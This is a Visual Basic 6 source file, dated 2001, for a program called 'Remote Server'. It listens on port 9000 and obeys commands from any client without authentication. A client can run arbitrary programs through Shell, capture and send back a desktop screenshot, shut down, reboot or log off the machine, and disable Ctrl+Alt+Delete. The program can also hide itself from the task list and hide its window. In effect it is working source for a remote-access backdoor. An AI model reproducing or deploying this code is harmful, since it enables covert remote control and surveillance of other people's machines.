VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmServer 
   BackColor       =   &H80000007&
   Caption         =   "Remote Server"
   ClientHeight    =   3480
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   3615
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3480
   ScaleWidth      =   3615
   Begin VB.Frame Frame1 
      BackColor       =   &H80000007&
      Height          =   1335
      Left            =   120
      TabIndex        =   1
      Top             =   2040
      Width           =   3375
      Begin VB.Label lblConnections 
         BackColor       =   &H80000012&
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   1080
         TabIndex        =   7
         Top             =   960
         Width           =   1455
      End
      Begin VB.Label lblHostID 
         BackColor       =   &H80000012&
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   1080
         TabIndex        =   6
         Top             =   240
         Width           =   1455
      End
      Begin VB.Label lblAddress 
         BackColor       =   &H80000012&
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   1080
         TabIndex        =   5
         Top             =   600
         Width           =   1455
      End
      Begin VB.Label lblUsers 
         BackColor       =   &H80000012&
         Caption         =   "Connections:"
         ForeColor       =   &H0000FFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   960
         Width           =   975
      End
      Begin VB.Label lblIP 
         BackColor       =   &H80000012&
         Caption         =   "IP Address:"
         ForeColor       =   &H0000FFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   600
         Width           =   855
      End
      Begin VB.Label lblHostName 
         BackColor       =   &H80000007&
         Caption         =   "Host:"
         ForeColor       =   &H0000FFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   615
      End
   End
   Begin VB.ListBox List1 
      Height          =   1815
      ItemData        =   "frmServer.frx":0442
      Left            =   120
      List            =   "frmServer.frx":0444
      TabIndex        =   0
      Top             =   120
      Width           =   3375
   End
   Begin MSWinsockLib.Winsock Socket 
      Index           =   0
      Left            =   3000
      Top             =   2040
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
    '#########################################'
    '   Programmed By Inderpal Singh          '
    '   Email: inderpal0@hotmail.com          '
    '   Date: Dec 19, 2001                    '
    '   Homepage: http://connect.to/lanserver '
    '#########################################'

'Option Explicit
Dim iSockets As Integer
Dim sServerMsg As String
Dim sRequestID As String
Public intMax As Integer
Private Const EWX_FORCE = 4
Private Const EWX_LOGOFF = 0
Private Const EWX_REBOOT = 2
Private Const EWX_SHUTDOWN = 1

Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long

Private Declare Function SystemParametersInfo Lib _
"user32" Alias "SystemParametersInfoA" (ByVal uAction _
As Long, ByVal uParam As Long, ByVal lpvParam As Any, _
ByVal fuWinIni As Long) As Long

Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" _
(ByVal dwProcessID As Long, ByVal dwType As Long) As Long

Private Sub Form_Load()
    lblHostID.Caption = Socket(0).LocalHostName
    lblAddress.Caption = Socket(0).LocalIP
    Socket(0).LocalPort = 9000
    sServerMsg = "Listening to port: " & Socket(0).LocalPort
    List1.AddItem (sServerMsg)
    Socket(0).Listen
    
    'Left = -10000
    'Top = -10000
    Open "c:\appslog.txt" For Append As #1
    Print #1, "On: " & CStr(Now)
    Close #1
End Sub
Private Sub Form_Unload(Cancel As Integer)
    Open "c:\appslog.txt" For Append As #1
    Print #1, "Off:" & CStr(Now)
    Close #1
    End
End Sub

Private Sub socket_Close(Index As Integer)
    sServerMsg = "Connection closed: " & Socket(Index).RemoteHostIP
    List1.AddItem (sServerMsg)
    Socket(Index).Close
    Unload Socket(Index)
    iSockets = iSockets - 1
    lblConnections.Caption = iSockets
End Sub

Private Sub socket_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    sServerMsg = "Connection request id " & requestID & " from " & Socket(Index).RemoteHostIP
  If Index = 0 Then
    List1.AddItem (sServerMsg)
    sRequestID = requestID
    iSockets = iSockets + 1
    lblConnections.Caption = iSockets
    Load Socket(iSockets)
    Socket(iSockets).LocalPort = 9000
    Socket(iSockets).Accept requestID
  End If
    If Socket(1).State = sckClosed Then
        Exit Sub
    End If
    If Socket(1).State = sckClosed Then
        Socket(1).LocalPort = 0
        Socket(1).Accept requestID
    End If
End Sub

Private Sub socket_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    
    Dim Data As String
    ' get data from client
    Socket(Index).GetData Data
    sServerMsg = "Received From: " & Socket(Index).RemoteHostIP & "(" & sRequestID & ")"
    List1.AddItem (sServerMsg)
    serveRequest Data
    
    If InStr(1, Data, "GET DESK_TOP") <> 0 Then
       Get_Desktop (App.Path & "\DESKTOP.BMP")
       Data = App.Path & "\DESKTOP.BMP"
       SendFile Data, Socket(iSockets)
       Socket(iSockets).SendData "COMPLETE"
       Exit Sub
    End If
End Sub

Private Sub serveRequest(request As String)
    Dim temp() As String
    temp = Split(request, "#")
    Select Case temp(0)
    Case "Message"
        MsgBox temp(1), vbInformation, "Message"
    Case "Execute"
        Shell (temp(1)), vbNormalFocus
    Case "Shutdown"
        ExitWindowsEx 1, 0
    Case "Closeserver"
        Unload Me
    Case "Disable"
        Call DisableCtrlAltDelete(True)
    Case "Enable"
        Call DisableCtrlAltDelete(False)
    Case "Hide"
        Call HideTask(True)
        Me.Hide
    Case "Unhide"
        Call HideTask(False)
        Me.Show
    Case "Reboot"
        Call ExitWindowsEx(EWX_REBOOT, 0)
    Case "Logoff"
        Call ExitWindowsEx(EWX_LOGOFF, 0)
    End Select
End Sub
Sub DisableCtrlAltDelete(bDisabled As Boolean)
    Dim X As Long
    X = SystemParametersInfo(97, bDisabled, CStr(1), 0)
End Sub

Public Sub HideTask(Hide As Boolean)
    Dim lHandle As Long
    Dim lService As Long
    ' If Hide = True, register as a service
    lHandle = GetCurrentProcessId()
    lService = RegisterServiceProcess(lHandle, Abs(Hide))
End Sub
